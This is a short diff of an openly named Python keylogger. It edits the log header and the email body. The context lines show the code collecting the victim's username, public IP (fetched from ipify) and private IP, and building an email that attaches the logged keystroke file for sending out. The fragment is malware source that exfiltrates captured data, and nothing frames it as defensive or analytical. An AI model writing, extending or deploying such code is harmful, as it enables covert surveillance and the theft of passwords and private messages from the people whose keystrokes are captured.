@@ -38,7 +38,7 @@ user = os.path.expanduser( '~' ).split( '\\' )[2]
 publicIP = requests.get( 'https://api.ipify.org/' ).text
 privateIP = socket.gethostbyname( socket.gethostname() )
 
-msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
+msg = f'[START OF LOGS]\n  *~ Keylogger run Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
 logged_data = []
 logged_data.append( msg )
 
@@ -161,7 +161,7 @@ def send_logs():
                 msg['From'] = fromAddr
                 msg['To'] = toAddr
                 msg['Subject'] = subject
-                body = 'Keylogged open with a txt editor'
+                body = time.ctime(time.time())
                 msg.attach( MIMEText( body, 'plain' ) )
 
                 attachment = open( delete_file[0], 'rb' )
